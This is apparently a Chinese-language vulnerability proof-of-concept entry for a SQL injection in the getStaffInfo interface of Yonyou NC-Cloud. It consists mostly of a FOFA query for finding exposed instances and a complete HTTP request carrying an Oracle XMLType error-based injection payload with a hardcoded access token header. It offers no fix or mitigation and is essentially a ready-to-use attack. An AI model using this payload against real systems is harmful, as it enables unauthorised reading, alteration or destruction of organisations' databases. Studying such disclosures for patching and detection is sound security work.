# 用友NC-Cloud系统接口getStaffInfo存在SQL注入漏洞

用友NC-Cloud系统getStaffInfo接口存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa
```javascript
app="用友-NC-Cloud"
```

## poc
```javascript
GET /ncchr/attendstaff/getStaffInfo?id=1%27%29+AND+2787%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%282787%3D2787%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+gPZR HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

![image-20241219152316693](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191523762.png)
